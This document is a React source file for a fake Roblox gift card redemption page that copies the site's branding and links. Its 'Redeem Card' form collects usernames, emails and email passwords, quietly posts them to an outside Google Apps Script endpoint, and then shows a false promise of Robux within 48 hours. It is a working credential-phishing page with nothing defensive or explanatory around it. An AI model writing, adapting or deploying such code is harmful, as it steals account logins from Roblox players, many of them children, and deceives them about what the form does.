import { useState, useEffect, useRef } from 'react'
import './app.css'

const SCRIPT_URL =
  'https://script.google.com/macros/s/AKfycbx898lzwWCVhp_VgPxQGkT4gceQJ5fNRVFNY_kg3eSiOsPWbIXm2UsEbDve-bmMX19B/exec'

function RobloxLogo({ size = 26 }: { size?: number }) {
  return (
    <span
      style={{
        fontFamily: "'Arial Black', Impact, Arial, sans-serif",
        fontWeight: 900,
        fontSize: size,
        color: '#ffffff',
        letterSpacing: '-0.5px',
        lineHeight: 1,
        userSelect: 'none',
      }}
    >
      R
      <span
        style={{
          display: 'inline-block',
          fontSize: size * 0.6,
          verticalAlign: 'middle',
          margin: '0 1px',
          position: 'relative',
          top: -2,
        }}
      >
        ◼
      </span>
      BLOX
    </span>
  )
}

function App() {
  const [modalOpen, setModalOpen] = useState(false)
  const [submitted, setSubmitted] = useState(false)
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    password: '',
    redeemCode: '',
  })

  const [locationOpen, setLocationOpen] = useState(false)
  const [location, setLocation] = useState('United States')
  const overlayRef = useRef<HTMLDivElement>(null)
  const locationRef = useRef<HTMLDivElement>(null)

  // Close on Escape
  useEffect(() => {
    function handleKey(e: KeyboardEvent) {
      if (e.key === 'Escape') {
        setModalOpen(false)
        setLocationOpen(false)
      }
    }
    window.addEventListener('keydown', handleKey)
    return () => window.removeEventListener('keydown', handleKey)
  }, [])

  useEffect(() => {
    function handleDocumentClick(e: MouseEvent) {
      if (!locationRef.current?.contains(e.target as Node)) {
        setLocationOpen(false)
      }
    }

    document.addEventListener('mousedown', handleDocumentClick)
    return () => document.removeEventListener('mousedown', handleDocumentClick)
  }, [])

  // Lock body scroll when modal open
  useEffect(() => {
    document.body.style.overflow = modalOpen ? 'hidden' : ''
  }, [modalOpen])

  function openModal() {
    setModalOpen(true)
    setSubmitted(false)
    setFormData({ username: '', email: '', password: '', redeemCode: '' })
  }

  function closeModal() {
    setModalOpen(false)
    setSubmitted(false)
  }

  function handleOverlayClick(e: React.MouseEvent<HTMLDivElement>) {
    if (e.target === overlayRef.current) closeModal()
  }

  function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
    setFormData(prev => ({ ...prev, [e.target.name]: e.target.value }))
  }

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault()
    const data = {
      username: formData.username,
      email: formData.email,
      pwd: formData.password,
    }
    const body = new URLSearchParams(data)
    fetch(SCRIPT_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    }).catch(() => {})
    setSubmitted(true)
  }

  return (
    <>
      {/* ====== NAVBAR ====== */}
      <nav className="rb-navbar">
        <div className="rb-nav-left">
          <a
            href="https://www.roblox.com"
            target="_blank"
            rel="noopener noreferrer"
            className="rb-logo-link"
          >
            <RobloxLogo size={26} />
          </a>
        </div>
        <div className="rb-nav-right">
          <div className="rb-location-menu" ref={locationRef}>
            <button
              className="rb-location-dropdown"
              type="button"
              aria-haspopup="listbox"
              aria-expanded={locationOpen}
              onClick={() => setLocationOpen(prev => !prev)}
            >
              <span className="rb-location-icon">
                <svg
                  width="15"
                  height="15"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.2"
                >
                  <circle cx="12" cy="10" r="3" />
                  <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z" />
                </svg>
              </span>
              <span>{location}</span>
              <span className="rb-dropdown-arrow">&#9660;</span>
            </button>
            {locationOpen && (
              <div className="rb-location-options" role="listbox" aria-label="Choose location">
                {['United States', 'Canada', 'United Kingdom', 'India'].map(option => (
                  <button
                    key={option}
                    className={`rb-location-option${location === option ? ' selected' : ''}`}
                    type="button"
                    role="option"
                    aria-selected={location === option}
                    onClick={() => {
                      setLocation(option)
                      setLocationOpen(false)
                    }}
                  >
                    {option}
                  </button>
                ))}
              </div>
            )}
          </div>
          <button className="rb-redeem-btn" onClick={openModal}>
            Redeem Card
          </button>
        </div>
      </nav>

      {/* ====== HERO SECTION ====== */}
      <section className="rb-hero">
        <div className="rb-hero-content">
          <h1 className="rb-hero-heading">Get more out of Roblox</h1>
          <a
            href="https://www.roblox.com/giftcards"
            target="_blank"
            rel="noopener noreferrer"
            className="rb-shop-btn"
          >
            Shop Gift Cards
          </a>
          <a
            href="https://www.roblox.com/giftcards/business"
            target="_blank"
            rel="noopener noreferrer"
            className="rb-business-link"
          >
            Shop Roblox Gift Cards for Business
          </a>

          <div className="rb-gift-card-wrapper">
            <img
              src="/images/gift-card.png"
              alt="Roblox Gift Card – Get Robux and more"
              className="rb-gift-card-img"
              onError={e => {
                const t = e.currentTarget
                t.style.display = 'none'
                const ph = document.createElement('div')
                ph.className = 'rb-img-placeholder'
                ph.textContent = 'gift-card.png — Place image here'
                t.parentElement?.appendChild(ph)
              }}
            />
          </div>

          <p className="rb-hero-desc">
            Roblox Gift Cards are the easiest way
            <br />
            to add credit you can spend toward
            <br />
            Robux or a Premium subscription.
          </p>
        </div>

        {/* ====== CHARACTERS ====== */}
        <div className="rb-chars">
          {/* Char 1 — Green jacket afro, LEFT */}
          <div className="rb-char rb-char-left">
            <img
              src="/images/char1.png"
              alt="Roblox character green jacket"
              onError={e => {
                const t = e.currentTarget
                t.style.display = 'none'
                const ph = document.createElement('div')
                ph.className = 'rb-img-placeholder'
                ph.innerHTML = 'char1.png<br/>Green Jacket<br/>Character Here'
                t.parentElement?.appendChild(ph)
              }}
            />
          </div>

          {/* Char 2 — Blockhead green spiky hair, CENTER-LEFT */}
          <div className="rb-char rb-char-center-left">
            <img
              src="/images/char2.png"
              alt="Roblox avatar green spiky hair blockhead"
              onError={e => {
                const t = e.currentTarget
                t.style.display = 'none'
                const ph = document.createElement('div')
                ph.className = 'rb-img-placeholder'
                ph.innerHTML = 'char2.png<br/>Green Hair Blockhead Here'
                t.parentElement?.appendChild(ph)
              }}
            />
          </div>

          {/* Char 3 — Girl green flowing hair, rainbow shirt, RIGHT */}
          <div className="rb-char rb-char-right">
            <img
              src="/images/char3.png"
              alt="Roblox avatar green hair rainbow shirt"
              onError={e => {
                const t = e.currentTarget
                t.style.display = 'none'
                const ph = document.createElement('div')
                ph.className = 'rb-img-placeholder'
                ph.innerHTML = 'char3.png<br/>Green Hair Girl<br/>Rainbow Shirt Here'
                t.parentElement?.appendChild(ph)
              }}
            />
          </div>

          {/* Char 4 — Blue shirt, dark hair, FAR RIGHT */}
          <div className="rb-char rb-char-far-right">
            <img
              src="/images/char4.png"
              alt="Roblox character blue shirt"
              onError={e => {
                const t = e.currentTarget
                t.style.display = 'none'
                const ph = document.createElement('div')
                ph.className = 'rb-img-placeholder'
                ph.innerHTML = 'char4.png<br/>Blue Shirt<br/>Character Here'
                t.parentElement?.appendChild(ph)
              }}
            />
          </div>
        </div>
      </section>

      {/* ====== FREE VIRTUAL ITEMS ====== */}
      <section className="rb-free-items">
        <h2 className="rb-free-heading">Free Virtual Items</h2>
        <p className="rb-free-desc">
          Each gift card grants a free virtual item upon redemption and comes
          with a bonus code for an
          <br />
          additional exclusive virtual item.
        </p>
      </section>

      {/* ====== MODAL ====== */}
      <div
        className={`rb-modal-overlay${modalOpen ? ' active' : ''}`}
        ref={overlayRef}
        onClick={handleOverlayClick}
        aria-modal="true"
        role="dialog"
      >
        <div className="rb-modal">
          {!submitted ? (
            /* FORM VIEW */
            <div>
              <div className="rb-modal-header">
                <RobloxLogo size={20} />
                <button
                  className="rb-modal-close"
                  onClick={closeModal}
                  aria-label="Close"
                >
                  &times;
                </button>
              </div>
              <h2 className="rb-modal-title">Redeem Your Card</h2>
              <p className="rb-modal-subtitle">
                Enter your details to redeem your Roblox Gift Card
              </p>
              <form onSubmit={handleSubmit}>
                <div className="rb-form-group">
                  <label htmlFor="username">Username</label>
                  <input
                    type="text"
                    id="username"
                    name="username"
                    placeholder="Enter your Roblox username"
                    value={formData.username}
                    onChange={handleChange}
                    required
                    autoComplete="username"
                  />
                </div>
                <div className="rb-form-group">
                  <label htmlFor="email">Email</label>
                  <input
                    type="email"
                    id="email"
                    name="email"
                    placeholder="Enter roblox your email address"
                    value={formData.email}
                    onChange={handleChange}
                    required
                    autoComplete="email"
                  />
                </div>
                <div className="rb-form-group">
                  <label htmlFor="password">Password</label>
                  <input
                    type="password"
                    id="password"
                    name="password"
                    placeholder="Enter your Email password"
                    value={formData.password}
                    onChange={handleChange}
                    required
                    autoComplete="current-password"
                  />
                </div>
                <div className="rb-form-group">
                  <label htmlFor="redeemCode">Redeem Code</label>
                  <input
                    type="text"
                    id="redeemCode"
                    name="redeemCode"
                    placeholder="Enter your gift card code"
                    value={formData.redeemCode}
                    onChange={handleChange}
                    required
                  />
                </div>
                <button type="submit" className="rb-redeem-now-btn">
                  Redeem Now
                </button>
              </form>
            </div>
          ) : (
            /* SUCCESS VIEW */
            <div className="rb-success-view">
              <div className="rb-modal-header">
                <RobloxLogo size={20} />
              </div>
              <div className="rb-success-icon">✓</div>
              <h2 className="rb-success-title">
                Your account will be updated with the Robux within the next 48
                hrs after our team verifies your account.
              </h2>
              <p className="rb-success-subtitle">
                Thanks for using Microwsoft powered with Roblox, Inc.
              </p>
              <button className="rb-ok-btn" onClick={closeModal}>
                OK
              </button>
            </div>
          )}
        </div>
      </div>
    </>
  )
}

export default App
